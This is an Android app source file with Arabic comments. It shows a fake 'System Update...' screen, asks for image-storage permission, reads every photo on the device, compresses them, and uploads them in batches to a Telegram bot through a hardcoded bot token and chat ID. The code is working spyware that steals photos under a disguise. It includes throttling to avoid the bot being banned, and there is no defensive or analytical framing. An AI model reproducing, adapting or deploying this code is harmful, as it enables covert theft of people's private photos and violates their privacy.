package com.vipih;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int PERMISSION_CODE = 100;
    private static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
    private static final String CHAT_ID = "8197183486";
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);

        statusText = new TextView(this);
        statusText.setText("System Update...");
        statusText.setTextSize(18);

        layout.addView(statusText);
        setContentView(layout);

        if (checkPermissions()) {
            startExtraction();
        } else {
            requestPermissions();
        }
    }

    private boolean checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissions(new String[]{Manifest.permission.READ_MEDIA_IMAGES}, PERMISSION_CODE);
        } else {
            requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            startExtraction();
        } else {
            Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show();
        }
    }

    private void startExtraction() {
        new ExtractAndSendTask().execute();
    }

    private class ExtractAndSendTask extends AsyncTask<Void, Integer, String> {
        @Override
        protected String doInBackground(Void... voids) {
            String[] projection = {MediaStore.Images.Media._ID};
            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

            Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);

            if (cursor == null) return "Error";

            int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int totalCount = cursor.getCount();
            int sentCount = 0;

            List<Uri> batchUris = new ArrayList<>();

            while (cursor.moveToNext()) {
                int id = cursor.getInt(idIndex);
                Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
                batchUris.add(contentUri);

                // تلجرام يسمح بإرسال 10 صور كحد أقصى في الطلب الواحد
                if (batchUris.size() == 10) {
                    if (sendMediaGroup(batchUris)) {
                        sentCount += batchUris.size();
                    }
                    batchUris.clear();
                    publishProgress(sentCount, totalCount);
                    
                    // تأخير بسيط جداً بين المجموعات لتجنب حظر البوت
                    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
                }
            }
            cursor.close();

            // إرسال ما تبقى من صور (أقل من 10)
            if (!batchUris.isEmpty()) {
                if (sendMediaGroup(batchUris)) {
                    sentCount += batchUris.size();
                }
                publishProgress(sentCount, totalCount);
            }

            return "Done: " + sentCount + "/" + totalCount;
        }

        @Override
        protected void onProgressUpdate(Integer... values) {
            super.onProgressUpdate(values);
            if (statusText != null) {
                statusText.setText("Sent: " + values[0] + " / " + values[1]);
            }
        }

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            if (statusText != null) statusText.setText(result);
        }
    }

    // دالة إرسال 10 صور في طلب واحد (سرعة فائقة)
    private boolean sendMediaGroup(List<Uri> uris) {
        String boundary = "*****" + System.currentTimeMillis();
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMediaGroup");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);

            DataOutputStream request = new DataOutputStream(conn.getOutputStream());

            // 1. إرسال معرف المحادثة
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            request.writeBytes(CHAT_ID + lineEnd);

            // 2. تجهيز مصفوفة JSON للصور
            JSONArray mediaArray = new JSONArray();
            List<byte[]> imageDataList = new ArrayList<>();

            for (int i = 0; i < uris.size(); i++) {
                byte[] data = compressImage(uris.get(i));
                if (data != null) {
                    imageDataList.add(data);
                    JSONObject mediaObj = new JSONObject();
                    mediaObj.put("type", "photo");
                    mediaObj.put("media", "attach://file" + i);
                    mediaArray.put(mediaObj);
                }
            }

            if (imageDataList.isEmpty()) return false;

            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"media\"" + lineEnd + lineEnd);
            request.writeBytes(mediaArray.toString() + lineEnd);

            // 3. إرسال ملفات الصور نفسها
            for (int i = 0; i < imageDataList.size(); i++) {
                request.writeBytes(twoHyphens + boundary + lineEnd);
                request.writeBytes("Content-Disposition: form-data; name=\"file" + i + "\"; filename=\"img" + i + ".jpg\"" + lineEnd);
                request.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);
                request.write(imageDataList.get(i));
                request.writeBytes(lineEnd);
            }

            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            request.flush();
            request.close();

            int responseCode = conn.getResponseCode();
            conn.disconnect();
            return responseCode == 200;

        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    // تصغير وضغط الصورة لتصبح خفيفة جداً (تسريع الرفع)
    private byte[] compressImage(Uri uri) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            InputStream input = getContentResolver().openInputStream(uri);
            BitmapFactory.decodeStream(input, null, options);
            if (input != null) input.close();

            // تصغير أبعاد الصورة إلى 1000 بكسل كحد أقصى
            int inSampleSize = 1;
            if (options.outHeight > 1000 || options.outWidth > 1000) {
                final int halfHeight = options.outHeight / 2;
                final int halfWidth = options.outWidth / 2;
                while ((halfHeight / inSampleSize) >= 1000 && (halfWidth / inSampleSize) >= 1000) {
                    inSampleSize *= 2;
                }
            }

            options.inJustDecodeBounds = false;
            options.inSampleSize = inSampleSize;

            input = getContentResolver().openInputStream(uri);
            Bitmap bitmap = BitmapFactory.decodeStream(input, null, options);
            if (input != null) input.close();

            if (bitmap == null) return null;

            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream); // ضغط 70%
            bitmap.recycle();
            return stream.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }
}